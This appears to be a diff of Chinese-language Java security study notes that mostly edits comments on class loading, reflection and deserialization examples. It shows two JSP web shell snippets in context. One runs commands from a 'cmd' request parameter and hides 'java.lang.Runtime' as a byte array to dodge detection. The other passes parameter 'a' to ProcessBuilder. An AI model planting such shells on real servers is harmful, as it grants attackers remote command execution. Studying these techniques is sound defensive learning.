@@ -293,7 +293,7 @@ public class CustomClassLoader extends ClassLoader {
     }  
   
     @Override  
-    protected Class<?> findClass(String name) throws ClassNotFoundException {  //父类classloader中有一哥findclass方法，所以重写
+    protected Class<?> findClass(String name) throws ClassNotFoundException {  //父类classloader中有一findclass方法，所以重写
         byte[] data = loadClassData(name); // 加载类的字节码数据  
         return defineClass(name, data, 0, data.length); // 定义类  
     }  
@@ -636,7 +636,7 @@ public class Test {
             Class<?> stringClass = String.class;  
   
             // 获取String类的带有一个Object参数的构造器  
-            Constructor<?> constructor = stringClass.getDeclaredConstructor(Object.class);  //获取构造器
+            Constructor<?> constructor = stringClass.getDeclaredConstructor(String.class);  //获取构造器
   
             // 使用得到的构造器创建新的String实例，参数为"Hello World"  
             String string = (String) constructor.newInstance("Hello World");  
@@ -1438,7 +1438,7 @@ java.lang.UNIXProcess.<init>(UNIXProcess.java:247)
 
 <%
     //定义request接收的参数
-    String str = request.getParameter("cmd");
+    String str = request.getParameter("cmd");//getParemeter获取参数
 
     //定义"java.lang.Runtime"字节变量，隐藏Runtime关键字，获取runtime类
     String rt = new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101});
@@ -1480,7 +1480,7 @@ java.lang.UNIXProcess.<init>(UNIXProcess.java:247)
 <%@ page import="java.io.ByteArrayOutputStream" %>
 <%@ page contentType="text/html;charset=UTF-8" language="java" %>
 <%
-    InputStream  ios=new ProcessBuilder(request.getParameter("a")).start().getInputStream();
+    InputStream  ios=new ProcessBuilder(request.getParameter("a")).start().getInputStream();//这里获取a，a就可以传参
     //这里使用了request.getParameter方法的原因是processbuilder只接收字符数组，getInputStream表示获取inputstream
     ByteArrayOutputStream bos = new ByteArrayOutputStream();
     byte [] bytes =new byte[1024];
@@ -1935,7 +1935,7 @@ public class javaUnSerialize {
         //反序列化：
         javaUnSerializeBean person=null;//先创建一个空对象，用于接受反序列化之后的对象
         FileInputStream fis=new FileInputStream("lisa.ser");//跟一个要被反序列化的文件位置
-        ObjectInputStream ois=new ObjectInputStream(fis);
+        ObjectInputStream ois=new ObjectInputStream(fis);//对象输入流
         person=(javaUnSerializeBean) ois.readObject();//反序列化字节流然后用一个对象接受
         fis.close();
         System.out.println(person.getAge());
